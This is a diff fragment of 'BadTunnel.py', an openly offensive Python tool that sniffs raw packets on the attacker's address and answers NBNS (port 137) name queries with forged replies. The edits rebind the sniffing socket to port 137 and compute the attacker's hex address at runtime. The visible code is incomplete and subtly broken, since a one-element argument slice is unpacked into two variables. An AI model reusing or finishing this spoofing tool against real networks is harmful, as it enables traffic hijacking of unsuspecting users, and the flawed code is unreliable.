@@ -1,6 +1,4 @@
 # BadTunnel.py
-#
-# Description: This program replys to NBNS requests with pre-defined answer.
 # -----------------------------------------
 
 # Imports
@@ -66,11 +64,13 @@ def hexAddr(addr):
 def main():
     attacker_ip, attacker_mac = sys.argv[1:2]
     sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
-    sniffer.bind((attacker_ip, 0))
+    sniffer.bind((attacker_ip, 137))
     sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
     print "Sniffing.."
     
+    attacker_ip_hex = hexAddr(attacker_ip)
+        
     # Sniffing Loop
     while True:
         data, addr = sniffer.recvfrom(65535)
@@ -78,7 +78,7 @@ def main():
         
         # Checks if port is 137 (NBNS) and the packet is in unicast.
         if int(data[SRC_PORT_START:SRC_PORT_END], 16) == PORT and \
-        data[IP_DST_START:IP_DST_END] == ATTCKR_IP_HEX:
+        data[IP_DST_START:IP_DST_END] == attacker_ip_hex:
             print "-------------"
             print "[X] Recieved unicast on port 137 (NBNS)"
             
